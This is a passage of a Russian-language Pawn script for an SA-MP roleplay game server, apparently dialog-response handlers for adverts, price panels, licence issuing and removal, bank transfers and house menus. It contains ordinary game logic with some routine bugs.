					SendClientMessageToAll(COLOR_GREEN, string);
					for(new i = GetPVarInt(playerid, "AdvertID"); i <= TOTALADVERT[full] - 1; i++)
					{
					    AdvertInfo[i][full][aPhone] = AdvertInfo[i+1][full][aPhone];
					    strmid(AdvertInfo[i][full][aText],AdvertInfo[i+1][full][aText],0,strlen(AdvertInfo[i+1][full][aText]), 128);
					    strmid(AdvertInfo[i][full][aName],AdvertInfo[i+1][full][aName],0,strlen(AdvertInfo[i+1][full][aName]), MAX_PLAYER_NAME);
					}
				 	if(TOTALADVERT[full] > 0) TOTALADVERT[full]--;
					AdvertTime = gettime() + 30;
					DeletePVar(playerid, "AdvertID");
					AdvertList(playerid);
				}
				case 4:
				{
					format(string, sizeof(string), "[AD] %s: %s Редактор: %s", AdvertInfo[GetPVarInt(playerid, "AdvertID")][full][aName], AdvertInfo[GetPVarInt(playerid, "AdvertID")][full][aText], GetName(playerid));
					SendAdminMessage(COLOR_YELLOW, string);
					for(new i = GetPVarInt(playerid, "AdvertID"); i <= TOTALADVERT[full] - 1; i++)
					{
					    AdvertInfo[i][full][aPhone] = AdvertInfo[i+1][full][aPhone];
					    strmid(AdvertInfo[i][full][aText],AdvertInfo[i+1][full][aText],0,strlen(AdvertInfo[i+1][full][aText]), 128);
					    strmid(AdvertInfo[i][full][aName],AdvertInfo[i+1][full][aName],0,strlen(AdvertInfo[i+1][full][aName]), MAX_PLAYER_NAME);
					}
					if(TOTALADVERT[full] > 0) TOTALADVERT[full]--;
					SendClientMessage(playerid, COLOR_LIGHTRED, "Объявление отправлено администрации");
					DeletePVar(playerid, "AdvertID");
					AdvertList(playerid);
				}
			}

		}
	case D_NMENU+7: ShowPlayerDialog(playerid, D_NMENU+6, 2, "Объявления", "Прочитать объявление\nРедактировать объявление\nУдалить объявление\nОтправить объявление\nОтправить администрации", "Принять", "Назад");
	case D_NMENU+8:
		{
			if(!response) return ShowPlayerDialog(playerid, D_NMENU+6, 2, "Объявления", "Прочитать объявление\nРедактировать объявление\nУдалить объявление\nОтправить объявление\nОтправить администрации", "Принять", "Назад");
			new full = 0;
			full = (PI[playerid][pMember] == TEAM_SMI) ? (0) : (1);
			new text[60];
			if(sscanf(inputtext, "s[128]",text))
			{
			    new string[128];
				format(string, 128, "{FFFFFF}Текст: %s - Прислал: %s",AdvertInfo[GetPVarInt(playerid, "AdvertID")][full][aText],AdvertInfo[GetPVarInt(playerid, "AdvertID")][full][aName]);
				return ShowPlayerDialog(playerid, D_NMENU+8, 1, "Объявления", string, "Принять", "Назад");
			}
			strmid(AdvertInfo[GetPVarInt(playerid, "AdvertID")][full][aText],text,0,strlen(text),sizeof(text));
			SendClientMessage(playerid, COLOR_LIGHTGREEN, "Объявление отредактировано и сохранено");
			ShowPlayerDialog(playerid, D_NMENU+6, 2, "Объявления", "Прочитать объявление\nРедактировать объявление\nУдалить объявление\nОтправить объявление\nОтправить администрации", "Принять", "Назад");
		}
	case D_NMENU+9:
		{
			if(!response) return 1;
			new price;
			if(sscanf(inputtext, "i",price)) return ShowPlayerDialog(playerid, D_NMENU+9, 1, "Панель", "{FFFFFF}Введите цену за 1 секунду в эфире\n\n{FFFF00}Примечание:\n{FFFFFF}Цена может быть от 1р до 3р", "Принять", "Отмена");
			if(price < 1 || price > 3) return ShowPlayerDialog(playerid, D_NMENU+9, 1, "Панель", "{FFFFFF}Введите цену за 1 секунду в эфире\n\n{FFFF00}Примечание:\n{FFFFFF}Цена может быть от 1р до 3р", "Принять", "Отмена");
			CallPrice[PI[playerid][pNews]-1] = price;
			SendMes(playerid, COLOR_LIGHTGREEN, "Цена за 1 секунду в эфире: %iр", price);
			format(NewsPrice, sizeof(NewsPrice),"%i, %i, %i, %i, %i, %i", SmsPrice[0], SmsPrice[1], CallPrice[0], CallPrice[1], AdvertPrice[0], AdvertPrice[1]);
			MysqlUpdateOtherStr("newsprice", NewsPrice);
		}
	case D_NMENU+10:
		{
			if(!response) return 1;
			new price;
			if(sscanf(inputtext, "i",price)) return ShowPlayerDialog(playerid, D_NMENU+10, 1, "Панель", "{FFFFFF}Введите цену за СМС\n\n{FFFF00}Примечание:\n{FFFFFF}Цена может быть от 10р до 20р", "Принять", "Отмена");
			if(price < 10 || price > 20) return ShowPlayerDialog(playerid, D_NMENU+10, 1, "Панель", "{FFFFFF}Введите цену за СМС\n\n{FFFF00}Примечание:\n{FFFFFF}Цена может быть от 10р до 20р", "Принять", "Отмена");
			SmsPrice[PI[playerid][pNews]-1] = price;
			SendMes(playerid, COLOR_LIGHTGREEN, "Цена за СМС: %iр", price);
			format(NewsPrice, sizeof(NewsPrice),"%i, %i, %i, %i, %i, %i", SmsPrice[0], SmsPrice[1], CallPrice[0], CallPrice[1], AdvertPrice[0], AdvertPrice[1]);
			MysqlUpdateOtherStr("newsprice", NewsPrice);
		}
	case D_NMENU+11:
		{
			if(!response) return 1;
			new price;
			if(sscanf(inputtext, "i",price)) return ShowPlayerDialog(playerid, D_NMENU+11, 1, "Панель", "{FFFFFF}Введите цену за 1 символ объявления\n\n{FFFF00}Примечание:\n{FFFFFF}Цена может быть от 5р до 10р", "Принять", "Отмена");
			if(price < 5 || price > 50) return ShowPlayerDialog(playerid, D_NMENU+11, 1, "Панель", "{FFFFFF}Введите цену за 1 символ объявления\n\n{FFFF00}Примечание:\n{FFFFFF}Цена может быть от 5р до 50р", "Принять", "Отмена");//убрать 10
			AdvertPrice[PI[playerid][pNews]-1] = price;
			SendMes(playerid, COLOR_LIGHTGREEN, "Цена за 1 символ объявления: %iр", price);
			format(NewsPrice, sizeof(NewsPrice),"%i, %i, %i, %i, %i, %i", SmsPrice[0], SmsPrice[1], CallPrice[0], CallPrice[1], AdvertPrice[0], AdvertPrice[1]);
			MysqlUpdateOtherStr("newsprice", NewsPrice);
		}
	case D_NMENU+12:
		{
			if(!response) return 1;
			switch(listitem)
			{
				//case 0: ShowPlayerDialog(playerid, D_NMENU+13, 1, "Панель", "{FFFFFF}Введите цену за 1кг угля\n\n{FFFF00}Примечание:\n{FFFFFF}Цена может быть от 1 до 50", "Принять", "Отмена");
				///case 1: ShowPlayerDialog(playerid, D_NMENU+14, 1, "Панель", "{FFFFFF}Введите цену за 1кг дров\n\n{FFFF00}Примечание:\n{FFFFFF}Цена может быть от 1 до 50", "Принять", "Отмена");
				//case 2: ShowPlayerDialog(playerid, D_NMENU+16, 1, "Панель", "{FFFFFF}Введите цену за 1 оружие\n\n{FFFF00}Примечание:\n{FFFFFF}Цена может быть от 100 до 500", "Принять", "Отмена");
				case 0: ShowPlayerDialog(playerid, D_NMENU+17, 1, "Панель", "{FFFFFF}Введите цену гос. налога\n\n{FFFF00}Примечание:\n{FFFFFF}Цена может быть от 0 до 300", "Принять", "Отмена");
				case 4: ShowPlayerDialog(playerid, D_NMENU+18, 1, "Панель", "{FFFFFF}Введите цену налога на тс\n\n{FFFF00}Примечание:\n{FFFFFF}Цена может быть от 0 до 200", "Принять", "Отмена");
				case 1: ShowPlayerDialog(playerid, D_HOME+3, 1, "Панель", "{FFFFFF}Введите цену освобождение из тюрьмы\n\n{FFFF00}Примечание:\n{FFFFFF}Цена может быть от 5.000 до 50.000", "Принять", "Отмена");
				case 2: ShowPlayerDialog(playerid, D_HOME+4, 1, "Панель", "{FFFFFF}Введите цену за получение паспорта\n\n{FFFF00}Примечание:\n{FFFFFF}Цена может быть от 0 до 2000", "Принять", "Отмена");
				case 3: ShowPlayerDialog(playerid, D_HOME+5, 1, "Панель", "{FFFFFF}Введите на сколько умножется зарплата\n1 - зп от 2тыс до 10тыс\n2 - зп от 4тыс до 20тыс\n3 - зп от 6тыс до 30тыс\n{FFFF00}Примечание:\n{FFFFFF}Значение может быть от 1 до 3", "Принять", "Отмена");
			}
		}
	case D_NMENU+15:
		{
			if(!response) return 1;
			new color[2], model, frac, status, Float:x, Float:y, Float:z, Float:angle;
			if(sscanf(inputtext,"p<,>iiiii",model, color[0], color[1], frac, status)) return ShowPlayerDialog(playerid, D_NMENU+15,1, "Добавить транспорт", "ВАЖНО: Модель, Цвет1, Цвет2, Фракция, Статус\nПРИМЕР: 504, 1, 3, 4, 0", "Принять", "Отмена");
			if(model < 400 || model > 611) return ShowPlayerDialog(playerid, D_NMENU+15, 1, "Добавить транспорт", "ВАЖНО: Модель, Цвет1, Цвет2, Фракция, Статус\nПРИМЕР: 504, 1, 3, 4, 0", "Принять", "Отмена");
			if(color[0] < 0 || color[0] > 252) return ShowPlayerDialog(playerid, D_NMENU+15, 1, "Добавить транспорт", "ВАЖНО: Модель, Цвет1, Цвет2, Фракция, Статус\nПРИМЕР: 504, 1, 3, 4, 0", "Принять", "Отмена");
			if(color[1] < 0 || color[1] > 252) return ShowPlayerDialog(playerid, D_NMENU+15, 1, "Добавить транспорт", "ВАЖНО: Модель, Цвет1, Цвет2, Фракция, Статус\nПРИМЕР: 504, 1, 3, 4, 0", "Принять", "Отмена");
			if(frac < 1 || frac > MAX_FRACTIONS-1) return ShowPlayerDialog(playerid, D_NMENU+15, 1, "Добавить транспорт", "ВАЖНО: Модель, Цвет1, Цвет2, Фракция, Статус\nПРИМЕР: 504, 1, 3, 4, 0", "Принять", "Отмена");
			GetPlayerFacingAngle(playerid,angle);
			GetPlayerPos(playerid, x, y, z);
			new carid = CreateVehicle(model, x, y, z, angle, color[0], color[1], 90000);
			PutPlayerInVehicle(playerid, carid, 0);
			LinkVehicleToInterior(carid, GetPlayerInterior(playerid));
			SetPVarInt(playerid, "AddVehicleFrac", carid);
			format(coordv, sizeof(coordv), "%i, %i, %i, %i, %i, %i, %i", model, color[0], color[1], frac,GetPlayerInterior(playerid),GetPlayerVirtualWorld(playerid),status);
			SendClientMessage(playerid, COLOR_LIGHTRED, "Тест транспорт создан. Установить координаты: /vpc");
		}
	case D_NMENU+17:
		{
			if(!response) return 1;
			new price;
			if(sscanf(inputtext, "i",price)) return ShowPlayerDialog(playerid, D_NMENU+17, 1, "Панель", "{FFFFFF}Введите цену гос. налога\n\n{FFFF00}Примечание:\n{FFFFFF}Цена может быть от 0 до 300", "Принять", "Отмена");
			if(price < 0 || price > 300) return ShowPlayerDialog(playerid, D_NMENU+17, 1, "Панель", "{FFFFFF}Введите цену гос. налога\n\n{FFFF00}Примечание:\n{FFFFFF}Цена может быть от 0 до 300", "Принять", "Отмена");
			MP1[0] = price;
			SendMes(playerid, COLOR_LIGHTGREEN, "Цена гос. налог состовляет: %iр", price);
			format(MerPanel, sizeof(MerPanel),"%i, %i, %i, %i, %i, %i", MP1[0], MP1[1], MP1[2], MP1[3], MP1[4], MP1[5]);
			MysqlUpdateOtherStr("merpanel", MerPanel);
		}
	case D_NMENU+18:
		{
			if(!response) return 1;
			new price;
			if(sscanf(inputtext, "i",price)) return ShowPlayerDialog(playerid, D_NMENU+18, 1, "Панель", "{FFFFFF}Введите цену гос. налога\n\n{FFFF00}Примечание:\n{FFFFFF}Цена может быть от 0р до 200", "Принять", "Отмена");
			if(price < 0 || price > 200) return ShowPlayerDialog(playerid, D_NMENU+18, 1, "Панель", "{FFFFFF}Введите цену гос. налога\n\n{FFFF00}Примечание:\n{FFFFFF}Цена может быть от 0 до 200", "Принять", "Отмена");
			MP1[1] = price;
			SendMes(playerid, COLOR_LIGHTGREEN, "Цена налога на тс состовляет: %iр", price);
			format(MerPanel, sizeof(MerPanel),"%i, %i, %i, %i, %i, %i", MP1[0], MP1[1], MP1[2], MP1[3], MP1[4], MP1[5]);
			MysqlUpdateOtherStr("merpanel", MerPanel);
		}
	case D_LIC+1:
		{
			if(!response) return DeletePVar(playerid, "LicName");

			new to_player = to_player;

			if(IsPlayerInRangeOfPlayer(15.0, playerid, to_player))
			{
				new text[32];
				switch(listitem)
				{
					case 0: text = "водительские права";
					case 1: text = "лицензию на судоходство";
					case 2: text = "лицензию на полеты";
					case 3: text = "лицензию на оружие";
					case 4: text = "патроны";
					case 5: text = "";
					case 6: text = "наркотики";
					case 7: text = "паспорт";
					case 8: text = "мед. карту";
				}
				if(listitem >= 0 && listitem < 4)
				{
				    if(!g_player_skills[to_player][S_LICS][listitem]) return SendClientMessage(playerid, COLOR_GREY, "У игрока нет этой лицензии");
					g_player_skills[to_player][S_LICS][listitem] = 0;
					if(IsPlayerInAnyVehicle(to_player) && listitem < 3) RemovePlayerFromVehicle(to_player);
					SendMes(playerid, COLOR_LIGHTBLUE, "Вы забрали %s у %s", text, GetName(to_player));
					SendMes(to_player, COLOR_LIGHTBLUE, "%s %s забрал у Вас %s", Fraction_Rang[PI[playerid][pMember]][PI[playerid][pRank]], GetName(playerid), text);

					SavePlayerSkills(playerid);
				}
				else
				{
					if(listitem == 4)
					{
					    if(!PI[to_player][pPatron]) return SendClientMessage(playerid, COLOR_GREY, "У игрока нет патрон");
						PI[to_player][pPatron] = 0;
						MysqlUpdatePlayerInt(to_player, "patron", PI[to_player][pPatron]);
						SendMes(playerid, COLOR_LIGHTBLUE, "Вы забрали %s у %s", text, GetName(to_player));
						SendMes(to_player, COLOR_LIGHTBLUE, "%s %s забрал у Вас %s", Fraction_Rang[PI[playerid][pMember]][PI[playerid][pRank]], GetName(playerid), text);
					}
					if(listitem == 5)
					{
					    if(!PI[to_player][pGunAmount]) return SendClientMessage(playerid, COLOR_GREY, "У игрока нет металла");
						PI[to_player][pGunAmount] = 0;
						MysqlUpdatePlayerInt(to_player, "gunamount", PI[to_player][pGunAmount]);
						SendMes(playerid, COLOR_LIGHTBLUE, "Вы забрали %s у %s", text, GetName(to_player));
						SendMes(to_player, COLOR_LIGHTBLUE, "%s %s забрал у Вас %s", Fraction_Rang[PI[playerid][pMember]][PI[playerid][pRank]], GetName(playerid), text);
					}
					if(listitem == 6)
					{
					    if(!PI[to_player][pDrugs]) return SendClientMessage(playerid, COLOR_GREY, "У игрока нет наркотиков");
						PI[to_player][pDrugs] = 0;
						MysqlUpdatePlayerInt(to_player, "drugs", PI[to_player][pDrugs]);
						SendMes(playerid, COLOR_LIGHTBLUE, "Вы забрали %s у %s", text, GetName(to_player));
						SendMes(to_player, COLOR_LIGHTBLUE, "%s %s забрал у Вас %s", Fraction_Rang[PI[playerid][pMember]][PI[playerid][pRank]], GetName(playerid), text);
					}
					if(listitem == 7)
					{
					    if(!PhoneNumbers[to_player][1]) return SendClientMessage(playerid, COLOR_GREY, "У игрока нет паспорта");
						PhoneNumbers[to_player][1] = 0;
						SendMes(playerid, COLOR_LIGHTBLUE, "Вы забрали %s у %s", text, GetName(to_player));
						SendMes(to_player, COLOR_LIGHTBLUE, "%s %s забрал у Вас %s", Fraction_Rang[PI[playerid][pMember]][PI[playerid][pRank]], GetName(playerid), text);
					}
					if(listitem == 8)
					{
					    if(!PhoneNumbers[to_player][2]) return SendClientMessage(playerid, COLOR_GREY, "У игрока нет паспорта");
						PhoneNumbers[to_player][2] = 0;
						SendMes(playerid, COLOR_LIGHTBLUE, "Вы забрали %s у %s", text, GetName(to_player));
						SendMes(to_player, COLOR_LIGHTBLUE, "%s %s забрал у Вас %s", Fraction_Rang[PI[playerid][pMember]][PI[playerid][pRank]], GetName(playerid), text);
					}
				}
			}
			else SendClientMessage(playerid, COLOR_GREY, "Игрок слишком далеко!");
			DeletePVar(playerid, "LicName");
		}
	case D_LIC+2:
		{
			if(!response) return DeletePVar(playerid, "LicName");
			new fmt_str[144];
			new to_player = GetPVarInt(playerid, "LicName");

			switch(listitem)
			{
				case 0:
				{
					g_player_skills[to_player][S_LICS][0] = 1;
					format(fmt_str, sizeof fmt_str, "Администратор %s выдал Вам водительские права", GetName(playerid));
					SendClientMessage(to_player, COLOR_LIGHTBLUE, fmt_str);

					format(fmt_str, sizeof fmt_str, "Вы выдали %s водительские права", GetName(to_player));
					SendClientMessage(playerid, COLOR_LIGHTBLUE, fmt_str);
				}
				case 1:
				{
					g_player_skills[to_player][S_LICS][1] = 1;
					format(fmt_str, sizeof fmt_str, "Администратор %s выдал Вам лицензию на судоходство", GetName(playerid));
					SendClientMessage(to_player, COLOR_LIGHTBLUE, fmt_str);

					format(fmt_str, sizeof fmt_str, "Вы выдали %s лицензию на судоходство", GetName(to_player));
					SendClientMessage(playerid, COLOR_LIGHTBLUE, fmt_str);
				}
				case 2:
				{
					g_player_skills[to_player][S_LICS][2] = 1;
					format(fmt_str, sizeof fmt_str, "Администратор %s выдал Вам лицензию на полеты", GetName(playerid));
					SendClientMessage(to_player, COLOR_LIGHTBLUE, fmt_str);

					format(fmt_str, sizeof fmt_str, "Вы выдали %s лицензию на полеты", GetName(to_player));
					SendClientMessage(playerid, COLOR_LIGHTBLUE, fmt_str);
				}
				case 3:
				{
					g_player_skills[to_player][S_LICS][3] = 1;
					format(fmt_str, sizeof fmt_str, "Администратор %s выдал Вам лицензию на оружие", GetName(playerid));
					SendClientMessage(to_player, COLOR_LIGHTBLUE, fmt_str);

					format(fmt_str, sizeof fmt_str, "Вы выдали %s лицензию на оружие", GetName(to_player));
					SendClientMessage(playerid, COLOR_LIGHTBLUE, fmt_str);
				}
				case 4:
				{
					for(new i; i < 4; i++) g_player_skills[playerid][S_LICS][i] = 1;

					format(fmt_str, sizeof fmt_str, "Администратор %s выдал Вам комплект лицензий", GetName(playerid));
					SendClientMessage(to_player, COLOR_LIGHTBLUE, fmt_str);

					format(fmt_str, sizeof fmt_str, "Вы выдали %s комплект лицензий", GetName(to_player));
					SendClientMessage(playerid, COLOR_LIGHTBLUE, fmt_str);
				}
			}
			SetPlayerSkills(to_player);
		}
	case D_LIC+3:
		{
			if(!response) return DeletePVar(playerid, "LicName");
			new text[32];
			new to_player = to_player;
			switch(listitem)
			{
				case 0: text = "водительские права";
				case 1: text = "лицензию на судоходство";
				case 2: text = "лицензию на полеты";
				case 3: text = "лицензию на оружие";
				case 4: text = "паспорт";
				case 5: text = "мед. карту";
			}
			if(listitem >= 0 && listitem < 4)
			{
			    if(!g_player_skills[to_player][S_LICS][listitem]) return SendClientMessage(playerid, COLOR_GREY, "У игрока нет этой лицензии");
				g_player_skills[to_player][S_LICS][listitem] = 0;
				if(IsPlayerInAnyVehicle(to_player) && listitem < 3) RemovePlayerFromVehicle(to_player);
				SendMes(playerid, COLOR_LIGHTBLUE, "Вы забрали %s у %s", text, GetName(to_player));
				SendMes(to_player, COLOR_LIGHTBLUE, "Администратор %s забрал у Вас %s",GetName(playerid), text);

				SavePlayerSkills(to_player);
			}
			else
			{
				if(listitem == 5)
				{
				    if(!PhoneNumbers[to_player][1]) return SendClientMessage(playerid, COLOR_GREY, "У игрока нет паспорта");
					PhoneNumbers[to_player][1] = 0;
					SendMes(playerid, COLOR_LIGHTBLUE, "Вы забрали %s у %s", text, GetName(to_player));
					SendMes(to_player, COLOR_LIGHTBLUE, "Администратор %s забрал у Вас %s",GetName(playerid), text);
				}
				if(listitem == 6)
				{
    				if(!PhoneNumbers[to_player][2]) return SendClientMessage(playerid, COLOR_GREY, "У игрока нет паспорта");
					PhoneNumbers[to_player][2] = 0;
					SendMes(playerid, COLOR_LIGHTBLUE, "Вы забрали %s у %s", text, GetName(to_player));
					SendMes(to_player, COLOR_LIGHTBLUE, "Администратор %s забрал у Вас %s",GetName(playerid), text);
				}
			}
		}
	case D_LIC+4:
		{
			if(!response) return 1;
			new targetid, price;
			if(sscanf(inputtext, "ui", targetid, price)) return ShowPlayerDialog(playerid, D_LIC+4, 1, "Перевод", "{FFFFFF}Введите ID или имя игрока и количество денег через запятую\n\nПример: Ivan_Ivanov, 10000", "Принять", "Назад");
			if(!IsPlayerConnected(targetid))
			{
				ShowPlayerDialog(playerid, D_LIC+4, 1, "Перевод", "{FFFFFF}Введите ID или имя игрока и количество денег через запятую\n\nПример: Ivan_Ivanov, 10000", "Принять", "Назад");
				return SendMess(playerid, MSG_PLAYER_OFFLINE);
			}
			if(PlayerLogged[targetid] == false)
			{
				ShowPlayerDialog(playerid, D_LIC+4, 1, "Перевод", "{FFFFFF}Введите ID или имя игрока и количество денег через запятую\n\nПример: Ivan_Ivanov, 10000", "Принять", "Назад");
				return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
			}
			if(PI[playerid][pBank] < price)
			{
				ShowPlayerDialog(playerid, D_LIC+4, 1, "Перевод", "{FFFFFF}Введите ID или имя игрока и количество денег через запятую\n\nПример: Ivan_Ivanov, 10000", "Принять", "Назад");
				return SendClientMessage(playerid, COLOR_GREY, "На вашем счету в банке не хватает денег!");
			}
			if(price < 1) return ShowPlayerDialog(playerid, D_LIC+4, 1, "Перевод", "{FFFFFF}Введите ID или имя игрока и количество денег через запятую\n\nПример: Ivan_Ivanov, 10000", "Принять", "Назад");
			GiveBankMoney(playerid, -price, "Transfer-");
		    GiveBankMoney(targetid, price, "Transfer+");
			SendMes(playerid, COLOR_WHITE, "Вы перевели %dр игроку %s[%d] на счет", price, GetName(targetid), playerid);
			SendMes(targetid, COLOR_WHITE, "Вам поступил перевод на Ваш счет в размере %dр от игрока %s[%d]", price, GetName(playerid), playerid);
			TransferReset[playerid] = 60;
		}
	case D_HOME:
		{
			if(!response) return 1;
			new a = GetPVarInt(playerid, "PlayerHouse");
			switch(listitem)
			{
				case 0:
				{
					if(HouseInfo[a][hLock] == 1)
					{
						HouseInfo[a][hLock] = 0;
						GameTextForPlayer(playerid, "~g~unlock", 5000, 5);
						MeAction(playerid, "открывает замок дома");
					}
					else
					{
						HouseInfo[a][hLock] = 1;
						GameTextForPlayer(playerid, "~r~lock", 5000, 5);
						MeAction(playerid, "закрывает замок дома");
					}
					PlayerPlaySound(playerid, 1145, 0.0, 0.0, 0.0);
					MysqlUpdateHouseInt(a, "hLock", HouseInfo[a][hLock]);
				}
				case 1:
				{
				    new string[167], str[42], oneskin[14], twoskin[14], threeskin[14], mskin[14];

				    if(!PI[playerid][pSkin][0]) format(oneskin, sizeof(oneskin), "{F04245}(нет)");
					else format(oneskin, sizeof(oneskin), "{63BD4E}(%i)", PI[playerid][pSkin][0]);
				    if(!PI[playerid][pSkin][1]) format(twoskin, sizeof(twoskin), "{F04245}(нет)");
					else format(twoskin, sizeof(twoskin), "{63BD4E}(%i)", PI[playerid][pSkin][1]);
				    if(!PI[playerid][pSkin][2]) format(threeskin, sizeof(threeskin), "{F04245}(нет)");
					else format(threeskin, sizeof(threeskin), "{63BD4E}(%i)", PI[playerid][pSkin][2]);
				    if(!PI[playerid][pMemberSkin]) format(mskin, sizeof(mskin), "{F04245}(нет)");
					else format(mskin, sizeof(mskin), "{63BD4E}(%i)", PI[playerid][pMemberSkin]);

				    format(str, sizeof(str), "{FFFFFF}Полка №1 %s\n", oneskin);
				    strcat(string, str);
				    format(str, sizeof(str), "{FFFFFF}Полка №2 %s\n", twoskin);
				    strcat(string, str);
				    format(str, sizeof(str), "{FFFFFF}Полка №3 %s\n", threeskin);
				    strcat(string, str);
				    format(str, sizeof(str), "{FFFFFF}Одежда организации %s", mskin);
				    strcat(string, str);

					ShowPlayerDialog(playerid, 1543, DIALOG_STYLE_LIST, "Гардероб", string, "Выбрать", "Назад");
				}
				case 2,3: callcmd::hmenu(playerid);
				case 4:
				{
				    new string[300];
				    format(string, sizeof(string), "%s",
				    (HouseInfo[a][hAutoDoors]) ? ("{FFFFFF}Автоматические двери\t| {63BD4E}Куплено\n") : ("{FFFFFF}Автоматические двери\t| {F04245}Не имеется (25000р)"),
					(HouseInfo[a][hGarage]) ? ("{FFFFFF}Гараж\t\t\t\t| {63BD4E}Куплено\n") : ("{FFFFFF}Гараж\t\t\t\t| {F04245}Не имеется (75000р)"));
					ShowPlayerDialog(playerid, D_HOMEULUCH, DIALOG_STYLE_LIST, "Улучшения дома", string, "Купить", "Назад");
				}
				case 5:
				{
					if(PI[playerid][pCredit] != 0) return SendClientMessage(playerid, COLOR_RED, "Во время кредита Вам запрещено продавать имущество");

					ShowPlayerDialog(playerid, D_SELLHOUSE, 0, "Продажа дома", "{FFFFFF}Вы действительно хотите продать свой дом?\nОт его продажи Вам вернётся только половина стоимости дома", "Принять", "Назад");
				}
				case 6:
				{
				    if(PI[playerid][pPhone][0] > 90) return SendClientMessage(playerid, COLOR_GREY, "У Вас достаточно зарядки на телефоне!");
					PI[playerid][pPhone][0] = 100;
					SendClientMessage(playerid, COLOR_GREY, "Вы успешно зарядили телефон!");

					new fmt_query[50+MAX_PLAYER_NAME];

					format(fmt_query, sizeof fmt_query, "UPDATE `accounts` SET `phone` = '%d, %d' WHERE `name` = '%s'", PI[playerid][pPhone][0], PI[playerid][pPhone][1], GetName(playerid));
					mysql_query(dbHandle, fmt_query);
				}
			}
		}
	case D_HOME+1:
	    {
	        if(!response) return 1;
			{
			    new a = GetPVarInt(playerid, "PlayerHouse");
			    switch(listitem)
			    {
			        case 0:
			        {
						if(PlayerToPoint(8.0, playerid, HouseInfo[a][hExitx], HouseInfo[a][hExity], HouseInfo[a][hExitz]) && GetPlayerVirtualWorld(playerid) == HouseInfo[a][hVirtual])
						{
							SetPlayerInterior(playerid, 0);
							SetPlayerVirtualWorld(playerid, 0);
							SetPlayerPos(playerid, HouseInfo[a][hEntrx], HouseInfo[a][hEntry], HouseInfo[a][hEntrz]);
						}
			        }
			        case 1:
			        {
			            if(PlayerToPoint(20, playerid, HouseInfo[a][hExitx], HouseInfo[a][hExity], HouseInfo[a][hExitz]))
			            {
							FreezePlayer(playerid, 5000);
							SetPlayerInterior(playerid, 0);
							SetPlayerVirtualWorld(playerid, HouseInfo[a][hVirtual]);
							SetVehicleVirtualWorld(GetPlayerVehicleID(playerid), HouseInfo[a][hVirtual]);
							SetPlayerPos(playerid, -1613.5419,1581.3352,2005.7100);
							SendClientMessage(playerid, COLOR_YELLOW, "Чтобы выехать из гаража, нажмите клавишу сигнала 'H' (за рулём)");
							if(!HouseInfo[a][hAutoDoors]) SendClientMessage(playerid, COLOR_YELLOW, "Если Вы хотите выйти из гаража, введите /exit (рядом с дверью)");
							else SendClientMessage(playerid, COLOR_YELLOW, "Если Вы хотите выйти из гаража, нажмите Левый ALT (рядом с дверью)");
						}
			        }
      			}
   			}
	    }
	case D_RADAR:
	{
	    if(!response) return false;
	    if(GetPVarInt(playerid, "CreateRadar")) return SendClientMessage(playerid,COLOR_GREEN,"Вы уже устанавливаете радар!");
	    SetPVarInt(playerid, "TypeRadar", listitem);
	    new Float: posX, Float: posY, Float: posZ;
	    GetPlayerPos(playerid, posX, posY, posZ);
	    SendClientMessage(playerid, COLOR_GREEN, "Вы начали установку радара. Поставьте радар в любую удобную для Вас позицию..");
		new radar = CreateObject(18880, posX+1, posY, posZ-0.35, 0.0, 0.0, 0.0);
		SetPVarInt(playerid, "CreateRadar", 1);
		SetPVarInt(playerid, "RadarObject", radar);
		EditObject(playerid, radar);
	}
	case D_HOME+2:
	    {
	        if(!response) return 1;
	        new a = GetPVarInt(playerid, "PlayerHouse");
	        new vehicleid = GetPlayerVehicleID(playerid);
	        SetVehiclePos(vehicleid, -1616.6018,1579.0420,2005.5146);
			PutPlayerInVehicle(playerid, vehicleid, 0);
			SetVehicleZAngle(vehicleid, 90.9035);
			SetCameraBehindPlayer(playerid);
			LinkVehicleToInterior(vehicleid, 0);
			SetPlayerInterior(playerid, 0);
			SetPlayerVirtualWorld(playerid, HouseInfo[a][hVirtual]);
			SetVehicleVirtualWorld(vehicleid, HouseInfo[a][hVirtual]);
			return 1;
	    }
	case D_HOME+3:
		{
			if(!response) return 1;
			new price;
			if(sscanf(inputtext, "i",price)) return ShowPlayerDialog(playerid, D_HOME+3, 1, "Панель", "{FFFFFF}Введите цену освобождение из тюрьмы\n\n{FFFF00}Примечание:\n{FFFFFF}Цена может быть от 5.000 до 50.000", "Принять", "Отмена");
			if(price < 5000 || price > 50000) return ShowPlayerDialog(playerid, D_HOME+3, 1, "Панель", "{FFFFFF}Введите цену освобождение из тюрьмы\n\n{FFFF00}Примечание:\n{FFFFFF}Цена может быть от 5.000 до 50.000", "Принять", "Отмена");
			MP1[2] = price;
			SendMes(playerid, COLOR_LIGHTGREEN, "Цена на освобождение из тюрьмы составляет: %iр", price);
			format(MerPanel, sizeof(MerPanel),"%i, %i, %i, %i, %i, %i", MP1[0], MP1[1], MP1[2], MP1[3], MP1[4], MP1[5]);
			MysqlUpdateOtherStr("merpanel", MerPanel);
		}
	case D_HOME+4:
		{
			if(!response) return 1;
			new price;
			if(sscanf(inputtext, "i",price)) return ShowPlayerDialog(playerid, D_HOME+4, 1, "Панель", "{FFFFFF}Введите цену за получение паспорт\n\n{FFFF00}Примечание:\n{FFFFFF}Цена может быть от 0 до 2000", "Принять", "Отмена");
			if(price < 0 || price > 2000) return ShowPlayerDialog(playerid, D_HOME+4, 1, "Панель", "{FFFFFF}Введите за цену получение паспорт\n\n{FFFF00}Примечание:\n{FFFFFF}Цена может быть от 0 до 2000", "Принять", "Отмена");
			MP1[3] = price;
			SendMes(playerid, COLOR_LIGHTGREEN, "Цена за получение паспорта составляет: %iр", price);
			format(MerPanel, sizeof(MerPanel),"%i, %i, %i, %i, %i, %i", MP1[0], MP1[1], MP1[2], MP1[3], MP1[4], MP1[5]);
			MysqlUpdateOtherStr("merpanel", MerPanel);
		}
	case D_HOME+5:
		{
			if(!response) return 1;
			new price;
			if(sscanf(inputtext, "i",price)) return ShowPlayerDialog(playerid, D_HOME+5, 1, "Панель", "{FFFFFF}Введите на сколько умножется зарплата\n1 - зп от 2тыс до 10тыс\n2 - зп от 4тыс до 20тыс\n3 - зп от 6тыс до 30тыс\n{FFFF00}Примечание:\n{FFFFFF}Значение может быть от 1 до 3", "Принять", "Отмена");
